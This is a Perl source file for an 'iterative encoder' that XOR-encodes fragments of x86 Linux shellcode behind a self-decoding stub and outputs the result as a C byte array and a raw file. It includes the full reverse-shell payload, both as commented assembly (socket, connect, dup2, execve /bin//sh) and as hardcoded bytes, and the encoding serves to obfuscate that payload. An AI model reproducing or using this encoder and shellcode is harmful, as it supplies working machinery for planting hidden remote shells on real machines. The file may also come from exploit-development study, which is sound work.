#! /usr/bin/perl -w

use strict;

# RJF 21 May 2013; from XW concept
# Input:  Code fragments (self referencing multi-basic block byte code that ends at a system call)
# Output: [init decoder stub][buffer filled with NOPS][encoded key changer][ encoded next frag decoder and caller][encoded frag0 .. N]

# For simplicity:
# -Each fragment should not depend on registers of previous fragments (assumes each fragment is to be augmented by the user to manage any necessary setup and teardown like restoring/saving registers, etc).
# -Any pushes should be reversed, or at minimum the iteration and key should be pushed on the top of stack at end of fragment
# -Any jmps/loops must be relative (short)
# -There can not be any jmps/loops to other fragments (must be self-referencing)

# Details:
# -Each iteration is one fragment 
# -Each fragment is padded so that they are an equal length
# -Decoding will use a 4B self-modified/chained/additive key that is modified for each fragment decoding
# -The initial decoder loop establishes a buffer that each iteration will be written into.
# -Initially there is an encoded key changer and next iteration decoder at the end of this buffer, the initial decoder loop also decodes these. They are used by every iteration (code is static).

# after init decoding:
# [init decoder stub with init key destroyed][buffer is now decoded frag0][key changer][next frag decoder and caller][encoded frag0 .. N]
# after frag0
# [init decoder stub with init key destroyed][buffer is now decoded frag1][key changer][next frag decoder and caller][encoded frag0 .. N]


# Original shellcode:
#0xffae05c0 31c031db 31d250b0 6643526a 016a0289  1.1.1.P.fCRj.j..
#0xffae05d0 e1cd8066 be020089 c7b066b3 03687f00  ...f......f..h..
#0xffae05e0 00016668 27106656 89e26a10 525789e1  ..fh'.fV..j.RW..
#0xffae05f0 cd8031c9 89fbb03f b100cd80 b03fb101  ..1....?.....?..
#0xffae0600 cd8031c9 51682f2f 7368682f 62696eb0  ..1.Qh//shh/bin.
#0xffae0610 0b89e351 89e25389 e1cd80             ...Q..S....  

#After being turned into frag compatible (perserve eax between iterations):
#            0 1 2 3  4 5 6 7  8 9 a b  c d e f   ASCII
# 0xffc1a060 31c031db 31d250b0 6643526a 016a0289  1.1.1.P.fCRj.j..
# 0xffc1a070 e1cd8031 db66be02 0089c7b0 66b30368  ...1.f......f..h
# 0xffc1a080 7f000001 66682710 665689e2 6a105257  ....fh'.fV..j.RW
# 0xffc1a090 89e1cd80 89f831c9 89c331c0 b03fb100  ......1...1..?..
# 0xffc1a0a0 cd80b03f b101cd80 31c95168 2f2f7368  ...?....1.Qh//sh
# 0xffc1a0b0 682f6269 6eb00b89 e35189e2 5389e1cd 80  h/bin....Q..S...

# ; reverseshell-ItEncCompatible.S
# BITS 32
# xor  eax,eax
# xor  ebx,ebx
# xor  edx,edx
# push eax
# 
# ; create socket
# mov  al,102                           ; socketcall 0x66
# inc  ebx                              ; b=1, _socket
# push edx                              ; protocol = 0
# push BYTE 0x1                         ; SOCK_STREAM = 1
# push BYTE 0x2                         ; AF_INET = 2
# mov  ecx,esp                          ; set args*
# int  0x80                             ; _socket (args* = {int domain = 0x2 (AF_INET), int type = 0x1 (SOCK_STREAM), int protocol = edx,0x0 (TCP/IP)});
# 
# ; ItEnc end frag0
# 
# ; ItEnc must preserve eax
# xor  ebx,ebx                          ; ItEnc clear ebx
# ; connect to remote host
# mov  si,0x2                           ; sockaddr family
# mov  edi,eax                          ; store returned sockfd
# 
# mov  al,102                           ; socketcall
# mov  bl,3                             ; b=3, _connect
# push DWORD 0x0100007f                 ; 127.0.0.1
# push WORD  0x1027                     ; port 4135
# push WORD  si                         ; AF_INET = 2
# mov  edx,esp                          ; set struct sockaddr*
# push BYTE 16                          ; addrlen
# push edx                              ; struct sockaddr*
# push edi                              ; sockfd
# mov  ecx,esp                          ; set args*
# int  0x80                             ; _connect (args* {int sockfd = edi, const struct sockaddr *addr = {0x2, port 4135, ip 127.0.0.1}, socklen_t addrlen = 16});
# mov  eax,edi                          ; ItEnc put sockfd into eax to preserve it
# 
# ; ItEnc end frag1
# 
# xor  ecx,ecx
# ; dup I/O so shell sends data over socket
# ;mov  ebx,edi                         ; oldfd = sockfd
# mov  ebx,eax                          ; ItEnc sockfd is in eax not edi
# xor  eax,eax                          ; ItEnc zero out eax
# mov  al,63                            ; _dup2 0x3f
# mov  cl,0                             ; newfd, standard input
# int  0x80                             ; _dup (sockfd, stdin);
# 
# mov  al,63                            ; _dup2 0x3f
# mov  cl,1                             ; newfd, standard out
# int  0x80                             ; _dup (sockfd, stdout);
# 
# ;mov eax,ebx                           ; ItEnc no more need for sockfd otherwise put sockfd into eax to preserve it
# 
# ; ItEnc end frag2
# 
# ; spawn shell
# xor  ecx,ecx
# push ecx                              ; null string termination
# push 0x68732f2f
# push 0x6e69622f                       ; /bin//sh
# 
# mov  al,11                            ; _execve 0xb
# mov  ebx,esp                          ; filename = "/bin//sh"
# push ecx                              ; generate a 32b null (empty array for envp)
# mov  edx,esp                          ; envp = array of 0x0s
# push ebx                              ; cmd = "/bin//sh"
# mov  ecx,esp                          ; argv*
# int  0x80                             ; _execve (const char* filename = "/bin//sh", char* const argv {"/bin//sh", NULL}, char* const envp {NULL});
# 
# ; ItEnc end frag3


# Initial Decoder
# 00000000  E916000000        jmp dword 0x1b
# 00000005  5A                pop edx                 ; next code to execute will be at edx
# 00000006  BB44332211        mov ebx,0x11223344      ; store INIT_KEY
# 0000000B  B9BB000000        mov ecx,0xbb            ; store BUFF_LEN (in 4B words)
# 00000010  315C8AFC          xor [edx+(ecx-1)*4],ebx ; [edx+ecx*4-0x4] start at end of Buff (edx+(ecx*4)) = start + numWords*4
# 00000014  E2FA              loop 0x10               ; ecx--; if ecx > 0 do next iteration
# 00000018  E905000000        jmp dword 0x20          ; jump past call
# 0000001B  E8E5FFFFFF        call dword 0x5          ; push PC, jmp 0x5

# test it with a 4B XOR constant key decoder, leaving key modifier empty, and next frag decoder call short jmp past frag_len
my $init_decoder = "\xE9\x16\x00\x00\x00\x5A\xBB" . "INIT_KEY" . "\xB9" . "BUFF_LEN" . "\x31\x5C\x8A\xFC\xE2\xFA\xE9\x05\x00\x00\x00\xE8\xE5\xFF\xFF\xFF";

# consider putting the key modifier at the end of init_decoder, and also after nextfragdecodecall (so it can use the last decoded value)
my $keymodifier = "";

# Testing next frag decode
# E904000000 jmp offset 0x9 (FRAG_LEN will be 4B)
my $nextfragdecodecall = "\xE9\x04\x00\x00\x00" . "FRAG_LEN";

# -Each iteration is one fragment 
# TODO automate fragmentation (ask user to verify no funky loops, search for cd80s, append move important values to unclobbered registers (eax right now), append necessary register clearing)
my @frag = ();
$frag[0] = ""; # this will become the initial buffer
$frag[1] = "\x31\xc0\x31\xdb\x31\xd2\x50\xb0\x66\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80";
$frag[2] = "\x31\xdb\x66\xbe\x02\x00\x89\xc7\xb0\x66\xb3\x03\x68\x7f\x00\x00\x01\x66\x68\x27\x10\x66\x56\x89\xe2\x6a\x10\x52\x57\x89\xe1\xcd\x80\x89\xf8";
$frag[3] = "\x31\xc9\x89\xc3\x31\xc0\xb0\x3f\xb1\x00\xcd\x80\xb0\x3f\xb1\x01\xcd\x80";
$frag[4] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";
my $frag_len = 5;


print "Iterative Encoder\n";

print "  Input fragments:\n";
for (my $i = 1; $i < $frag_len; $i++) {
   print "  $i: " . $frag[$i] . "\n";
}
print "\n";

# -Each fragment is padded so that they are an equal length
my $max_len = 0;
for (my $i = 0; $i < $frag_len; $i++) {
   if (length ($frag[$i]) > $max_len) {
      $max_len = length ($frag[$i]);
   }
}
# make fragment lengths a multiple of 4
$max_len += (4 - ($max_len % 4));
if ($max_len >= (128*4) ) {
   print "Error, fragment size currently limited to 127 words\n";
   exit;
}

for (my $i = 0; $i < $frag_len; $i++) {
   if (length ($frag[$i]) != $max_len) {
      # TODO randomized NOP selection, for now 'A' is an acceptable NOP
      $frag[$i] .= ('A' x ($max_len - length ($frag[$i]) ) );
   }
}

my $total_len = 0;
print "  Padded fragments, with initial NOP buffer: (len: $max_len)\n";
for (my $i = 0; $i < $frag_len; $i++) {
   print "  $i: " . $frag[$i] . "\n";
   $total_len += length ($frag[$i]);
}
printf "  Total length $total_len\n";
print "\n";

# -Decoding will use a 4B self-modified/chained/additive key that is modified for each fragment decoding
my $key = "\x11\x22\x33\x44"; # TODO randomize key
# -The initial decoder loop establishes a buffer that each iteration will be written into.
# -Initially there is an encoded key changer and next iteration decoder at the end of this buffer, the initial decoder loop also decodes these.
# make modified initial decoder stub. it must decode frag[0], the keymodifier, and the nextfragcaller, then call frag[0]
# it needs to know the initial key, max_len + keymodifier_len + nextfragcaller_len

# nextfragdecodecall needs to know max_len so it can decode the next frag
my $num_words = $max_len/4;
$num_words = pack('W', int($num_words)) . "\x00\x00\x00";
$nextfragdecodecall =~ s/FRAG_LEN/$num_words/;
# it may also need to know BUFF_LEN so it can jump back to the start of the buffer (start of the decoded next frag) after decoding
# keymodifier and nextfragcaller should be static (no change during execution)
# keymodifier requires no changes by this encoder
my $pad = "";
if ( length($keymodifier . $nextfragdecodecall) % 4 != 0) {
   # TODO randomize NOP
   $pad = ('A' x (4 - (length($keymodifier . $nextfragdecodecall) % 4) ) );
}
my $buffer = $frag[0] . $pad . $keymodifier . $nextfragdecodecall;
my $buffer_len = length ($buffer);
my $buffer_words = $buffer_len/4;
# buffer words limited to 1 byte! 127 words max!
# encode $buffer, returning key for next frag's encoding
print "  Unencoded buffer: ";
my $buf_hex = unpack('H*', $buffer);
for (my $i = 0; $i < length $buf_hex; $i+=2) {
   if($i % 8 eq 0){ print " ";}
   print substr $buf_hex, $i, 2;
}
print "\n";
($buffer, $key) = encode ($buffer, $key);
print "    Encoded buffer: ";
$buf_hex = unpack('H*', $buffer);
for (my $i = 0; $i < length $buf_hex; $i+=2) {
   if($i % 8 eq 0){ print " ";}
   print substr $buf_hex, $i, 2;
}
print "\n\n";

$init_decoder =~ s/INIT_KEY/$key/;
$buffer_words = pack('W', int($buffer_words)) . "\x00\x00\x00";
$init_decoder =~ s/BUFF_LEN/$buffer_words/;
my $output = $init_decoder . $buffer;
#print "  Initial decoder and buffer, etc:\n";
#print "$output";
#print "\n";

# encode the fragments
print "  Fragments:\n";
for (my $i = 1; $i < $frag_len; $i++) {
   # encode $frag[$i]
   print "           Unenc $i: ";
   my $frag_hex = unpack('H*', $frag[$i]);
   for (my $i = 0; $i < length $frag_hex; $i+=2) {
      if($i % 8 eq 0){ print " ";}
      print substr $frag_hex, $i, 2;
      #print "  $i: " . $frag[$i] . "\n";
   }
   print "\n";
   #($frag[$i], $key) = encode ($frag[$i], $key);
   print "             Enc $i: ";
   $frag_hex = unpack('H*', $frag[$i]);
   for (my $i = 0; $i < length $frag_hex; $i+=2) {
      if($i % 8 eq 0){ print " ";}
      print substr $frag_hex, $i, 2;
      #print "  $i: " . $frag[$i] . "\n";
   }
   print "\n";
   
   $output .= $frag[$i];
}
print "\n";


print "  Output: (len: " . length ($output) . ")\n";
print "  " . $output . "\n\n";
doOutput ($output);

exit;

sub encode {
   my ($input, $key) = @_;
   my $output = "" ;
   my $output_word;
   for (my $i = 0; $i < length ($input); $i+=4) {
      my $output_word = substr ($input, $i, 4);
      $output_word = $output_word ^ $key;
      $output .= $output_word; 
   }
   #$key += $output_word; # modify the key for the next fragment's encoding (decoder needs the same modification)
   return ($output, $key);
} # end sub encode




sub doOutput {
   my ($output) = @_;
   # print final shellcode in C language
   print "// STUB + SHELLCODE\n";
   print "unsigned char buf[] = ";
   my $hex = unpack('H*', $output);
   for (my $i = 0; $i < length $hex; $i+=2) {
      if($i % 15 eq 0){
         if($i eq 0) {print "\n\"";}
         else     {print "\"\n\"";}
      }
      print "\\x" . substr $hex, $i, 2;
   }
   print "\";\n\n";
   # print shellcode length (optional)
   print "unsigned int buf_len = ". do{length $output} . ";\n";

   #my $out_file = "xor-scode.rawshell";
   print "Outputting final shellcode to iterativeEncoder.rawshell\n";
   open (FILE, ">iterativeEncoder.rawshell");
   print FILE $output;
   close (FILE);
} # end sub doOutput

# end iterativeEncoder.pl
